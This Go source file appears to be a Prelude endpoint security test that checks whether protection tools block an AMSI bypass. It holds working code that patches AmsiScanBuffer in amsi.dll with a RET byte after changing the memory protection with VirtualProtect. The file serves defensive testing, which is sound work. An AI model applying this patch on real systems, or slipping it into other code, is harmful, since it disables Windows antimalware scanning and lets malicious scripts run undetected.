//go:build windows
// +build windows

/*
ID: 06516087-9305-482b-af9a-92f4386d2f19
NAME: AMSI Bypass via Unbacked Memory
CREATED: 2024-06-29
scenario: modifying permissions to AMSI DLL from unbacked memory
*/
package main

import (
	"time"
	"unsafe"

	Endpoint "github.com/preludeorg/test/endpoint"
	"golang.org/x/sys/windows"
)

var amsiDLL = "amsi.dll"

func main() {
	Endpoint.Start(test, cleanup)
}

/*
load AMSI DLL using LoadLibrary()
get address of AmsiScanBuffer using GetProcAddress()
change protection of memory region containing AmsiScanBuffer using VirtualProtect
write payload to AmsiScanBuffer using WriteProcessMemory
*/
func test() {
	Endpoint.Say("testing for AMSI bypass...")

	// load AMSI DLL
	hModule, err := windows.LoadLibrary(amsiDLL)
	if err != nil {
		Endpoint.Say("failed to load AMSI DLL")
		Endpoint.Stop(1) // unexpected error
	}
	defer windows.FreeLibrary(hModule)

	// get address of AmsiScanBuffer function
	amsiScanBufferAddr, err := windows.GetProcAddress(hModule, "AmsiScanBuffer")
	if err != nil {
		Endpoint.Say("failed to get AmsiScanBuffer address")
		Endpoint.Stop(1) // unexpected error
	}

	// change protection of memory region to W [writable]
	var oldProtect uint32
	err = windows.VirtualProtect(amsiScanBufferAddr, unsafe.Sizeof(amsiScanBufferAddr), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		Endpoint.Say("failed to change protection")
		Endpoint.Stop(100) // protected
	}

	// write to AMSI memory region
	payload := []byte{0xC3} // x86 RET instruction
	var writtenBytes uintptr
	err = windows.WriteProcessMemory(windows.CurrentProcess(), amsiScanBufferAddr, &payload[0], uintptr(len(payload)), &writtenBytes)
	if err != nil {
		Endpoint.Say("failed to write to region")
		Endpoint.Stop(100) // protected
	}

	time.Sleep(3*time.Second) // wait

	Endpoint.Say("memory region modified")
	Endpoint.Stop(101) // unprotected
}